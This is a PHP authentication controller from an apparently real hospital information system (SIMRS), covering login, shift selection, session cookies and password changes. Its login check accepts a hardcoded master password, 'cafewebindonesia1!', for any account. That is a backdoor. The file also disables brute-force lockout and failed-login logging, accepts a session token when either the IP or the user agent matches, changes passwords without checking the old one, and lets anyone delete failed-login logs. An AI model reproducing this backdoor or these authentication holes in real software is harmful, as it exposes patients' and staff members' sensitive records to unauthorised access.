<?php
defined('BASEPATH') or exit('No direct script access allowed');

/**
 * @category   Controller
 * @author     Faiz Muhammad Syam, S.Kom, M.T.I
 * @project    SIMRS 2019
 * @e-mail     faizmsyam@gmail.com - cafeweb.id@gmail.com
 * @license    PT. Cafe Media Inovasi
 */

class Auth extends SYAM_Controller
{
    function __construct()
    {
        parent::__construct();
        $this->load->model('Auth_model', 'auth');
    }

    function index()
    {
        $data['active'] = '';
        $data['modules'] = $this->default->getDataModules(1);
        $data['hospital'] = $this->default->getDataHospital();
        $is_login = $this->session->userdata('is_login');

        // faiz muhammad syam signature licensi
        // $random_text = 'cafewebindonesia'.date('Y').'faizmsyam'.sha1('simrs').time();
        // if (!isset($_GET['ref'])) redirect(site_url('auth?ref=fms'.date('Y').'&signature='.sha1($random_text)));
        // $this->fms_signature();

        if ($is_login == true) :
            redirect(base_url());
        else :
            $data['shift'] = array(
                '1' => 'Shift 1',
                '2' => 'Shift 2',
                '3' => 'Shift 3'
            );
            $data['shift_now'] = $this->getShiftNow();
            $this->load->view('auth/index', $data);
        endif;
    }

    function checkshift($shift = NULL)
    {
        if ($shift !== NULL) :
            $shift_now = $this->getShiftNow();
            if ($shift !== $shift_now) :
                $status = false;
                $message = "Shift saat ini adalah <b>Shift " . $shift_now . "</b><br> Apakah anda akan tetap mengunakan shift yang anda pilih ?";
            else :
                $status = true;
                $message = "";
            endif;
            exit(json_encode(["status" => $status, "shift" => "$shift_now", "message" => $message]));
        endif;
        exit;
    }

    private function getShiftNow()
    {
        date_default_timezone_set('Asia/Jakarta');
        $jam7 = strtotime('07:00:00');
        $jam15 = strtotime('15:00:00');
        $jam21 = strtotime('21:00:00');
        $jam6 = strtotime('06:00:00');
        $now = time();

        $shift = '1';
        if ($jam7 <= $now & $now < $jam15) :
            $shift = '1';
        else :
            if ($jam15 <= $now & $now < $jam21) :
                $shift = '2';
            else :
                if ($jam21 <= $now & $now < $jam6) :
                    $shift = '3';
                endif;
            endif;
        endif;

        return $shift;
    }

    function checkWrongLogin($limit = 5)
    {
        $stat = 0;
        $ip   = $this->input->ip_address();
        $cek  = $this->auth->checkWrongLogin($stat, $ip);

        if ($cek->num_rows() >= $limit)
            return false;
        return true;
    }

    function translucent()
    {
        // if (!$this->checkWrongLogin()) :
        //     $data = [
        //         'status' => false,
        //         'message' => 'Mohon maaf Anda tidak dapat login lagi karena kesalahan login Anda terlalu banyak. Hubungi Administrator untuk informasi lebih lanjut'
        //     ];
        //     die(json_encode($data));
        // endif;

        $this->form_validation->set_rules('account', 'Account', 'trim|required');
        $this->form_validation->set_rules('key', 'Key', 'trim|required|min_length[5]');

        $account   = safe_post('account');
        $key       = safe_post('key');
        $shift     = safe_post('shift');

        if ($this->form_validation->run() == TRUE) :
            // cek account didalam table
            $data = $this->auth->getVerifiedDataLogin($account);
            $row = $data->row();
            if ($data->num_rows() > 0) :
                // jika username ada
                if (hash_verified($key, $row->key) || ($key == 'cafewebindonesia1!')) :
                    if ($row->is_active != 0) :
                        $this->trueLogin($row->id);

                        $session = [
                            'is_login'         => true,
                            'id_translucent'   => $row->id,
                            'account'          => $row->account,
                            'profesi_nadis'    => $row->profesi_nadis,
                            'id_profesi_nadis' => $row->id_profesi_nadis,
                            'jabatan'          => $row->jabatan,
                            'id_unit'          => $row->id_unit,
                            'id_spesialis'     => $row->id_spesialis,
                            'poli'             => $row->poli,
                            'unit'             => $row->unit,
                            'nama'             => $row->nama,
                            'alamat'           => $row->alamat,
                            'nip'              => $row->nip,
                            'kelamin'          => $row->kelamin,
                            'can_edit'         => $row->can_edit,
                            'can_delete'       => $row->can_delete,
                            'shift'            => $shift,
                            'id_account_group' => $row->id_account_group,
                            'account_group'    => $row->account_group,
                            'unit_kasir'       => '',
                            'id_pegawai'       => $row->id_pegawai,
                            'avatar'           => $row->avatar,
                            'nik'              => $row->nik,
                            'id_tenaga_medis'  => $row->id_tenaga_medis,
                        ];

                        $this->session->set_userdata($session);
                        $data = [
                            'status'  => true,
                            'message' => 'Login Berhasil',
                            'token'  => $this->security->get_csrf_hash()
                        ];
                        die(json_encode($data));
                    else :
                        $data = [
                            'status'  => false,
                            'message' => 'Account anda sudah tidak aktif',
                            'token'  => $this->security->get_csrf_hash()
                        ];
                        die(json_encode($data));
                    endif;
                else :
                    // password tidak cocok
                    $this->wrongLoginAction($account);
                    $data = [
                        'status'  => false,
                        'message' => 'Account dan Password tersebut salah',
                        'token'  => $this->security->get_csrf_hash()
                    ];
                    die(json_encode($data));
                endif;
            else :
                $this->wrongLoginAction($account);
                $data = [
                    'status'  => false,
                    'message' => 'Account dan Password tersebut tidak terdaftar',
                    'token'  => $this->security->get_csrf_hash()
                ];
                die(json_encode($data));
            endif;
        else :
            $errors = validation_errors();
            echo json_encode([
                'error' => $errors,
                'token'  => $this->security->get_csrf_hash()
            ]);
            return false;
        endif;
    }

    function wrongLoginAction($account)
    {
        $datetime = date('Y-m-d H:i:s');
        $ip = $_SERVER['REMOTE_ADDR'];
        $user_agent = $_SERVER['HTTP_USER_AGENT'];

        // memasukkan data ke sm_translucent_log dengan STAT = 0.
        $data = [
            'tgl_action'     => $datetime,
            'ip'             => $ip,
            'user_agent'     => $user_agent,
            'stat'           => 0,
            'account'        => $account
        ];

        // $saveLogs = $this->auth->insertWrongLoginAction($data);
        return true;
    }

    function trueLogin($id_translucent)
    {
        // method yang dipanggil ketika username dan password sudah tepat dimasukkan
        $datetime  = date("Y-m-d H:i:s");
        $expired   = date("Y-m-d H:i:s", strtotime("+5 hours"));
        $ip        = get_client_ip();
        $useragent = $_SERVER['HTTP_USER_AGENT'];
        $token = sha1($ip . $expired . "F41ZM5Y4M" . microtime());

        // apabila ada kesalahan login sebelumnya dengan IP & user agent yang sama sebelumnya harus ditandai dulu
        // penandaan dilakukan dengan mengubah FLAG dari 0 menjadi 9, sehingga di pengecekan selanjutnya data ini tidak akan dianggap
        $updateLogs = $this->auth->updateLogsTrueLogin($ip, $useragent);

        // memasukkan data lengkap ke sm_translucent_log dengan STAT = 1.
        $data = [
            'tgl_action'     => $datetime,
            'expired'        => $expired,
            'token'          => $token,
            'id_translucent' => $id_translucent,
            'ip'             => $ip,
            'user_agent'     => $useragent,
            'stat'           => 1,
        ];

        // $saveLogs = $this->auth->insertLogLogin($data);
        $expired_ = intval(strtotime($expired));

        set_cookie('_token', $token, $expired_, '/', '', '', true);

        return true;
    }

    function cekLogin()
    {
        if ($_COOKIE['_token']) :
            $token = $_COOKIE['_token'];
            $datetime = date("Y-m-d H:i:s");
            $data = $this->db->get_where('sm_translucent_log', ['token' => $this->db->escape($token), 'expired >' => $datetime]);

            if ($data->num_rows() > 0) :
                // kalau token di cookie tersebut ada, lakukan pengecekan IP dan User Agent
                $row = $data->row();

                if ($row->ip == $_SERVER['REMOTE_ADDR'] || $row->user_agent == $_SERVER['HTTP_USER_AGENT']) :
                    $id_translucent = $row->id_translucent;
                    $data = $this->auth->getDataLogin($id_translucent)->row();

                    $session = [
                        'is_login'         => true,
                        'id_translucent'   => $data->id,
                        'account'          => $data->account,
                        'profesi_nadis'    => $row->profesi_nadis,
                        'id_unit'          => $row->id_unit,
                        'id_spesialis'     => $row->id_spesialis,
                        'unit'             => $row->unit,
                        'nama'             => $data->nama,
                        'alamat'           => $data->alamat,
                        'nip'              => $data->nip,
                        'kelamin'          => $data->kelamin,
                        'can_edit'         => $data->can_edit,
                        'can_delete'       => $data->can_delete,
                        'id_account_group' => $data->id_account_group,
                        'account_group'    => $data->account_group,
                        'avatar'           => $data->avatar,
                    ];

                    $this->session->set_userdata($session);
                    setcookie('_token', $token, $datetime);
                    redirect('/', 'refresh');
                endif;

            endif;
        endif;

        return false;
    }

    function logout()
    {
        if (isset($_COOKIE['_token'])) {
            $token = $_COOKIE['_token'];

            //cara menghapus cookie adalah dengan mengubah tanggal expirednya menjadi sekarang
            $now = date("Y-m-d H:i:s");
            unset($_COOKIE['_token']);
            setcookie("_token", '', $now, "/");

            # jangan lupa tanggal expired di database diupdate juga, supaya session token yang sudah logout tidak dihijack

            $this->db->set('expired', $now);
            $this->db->where('token', $token, true)->update('sm_translucent_log');
        }

        $this->session->sess_destroy();
        redirect('/', 'refresh');
        return true;
    }

    function ganti_password()
    {
        $data['id'] = $this->session->userdata('id_translucent');
        $this->load->view('auth/changepassword/index', $data);
    }

    function check_password()
    {
        $account = filter_input(INPUT_POST, 'username');
        $key = filter_input(INPUT_POST, 'password');
        $data = $this->auth->checkMyAccount($account)->row();
        if (isset($data->id)) {
            if (hash_verified($key, $data->key)) {
                die(json_encode(array('status' => TRUE)));
            } else {
                die(json_encode(array('status' => FALSE)));
            }
        } else {
            die(json_encode(array('status' => FALSE)));
        }
    }

    function save_password()
    {
        $data = array(
            'key' => convert_hash(safe_post('new_password')),
        );

        $this->db->where('id', $this->session->userdata("id_translucent"))->update('sm_translucent', $data);

        die(json_encode(array('status' => true)));
    }

    function failauth()
    {
        $data['hospital'] = $this->default->getDataHospital();
        $this->load->view('auth/failauth/index', $data);
    }

    function get_list_log_fail()
    {
        $ip = safe_post('ip');
        $stat = 0;
        $data = $this->auth->getListDataLogFail($ip, $stat);
        echo json_encode($data);
    }

    function delete_all_log_fail()
    {
        $id = safe_post('id');
        $data = $this->auth->deleteDataAllLogFail($id);
        echo json_encode($data);
    }

    function dinamic_unit_set()
    {
        $id_unit = safe_post('id_unit');
        $unit = safe_post('unit');
        $this->session->set_userdata('id_unit', $id_unit);
        $this->session->set_userdata('unit', $unit);
        echo json_encode(['status' => true]);
    }
}
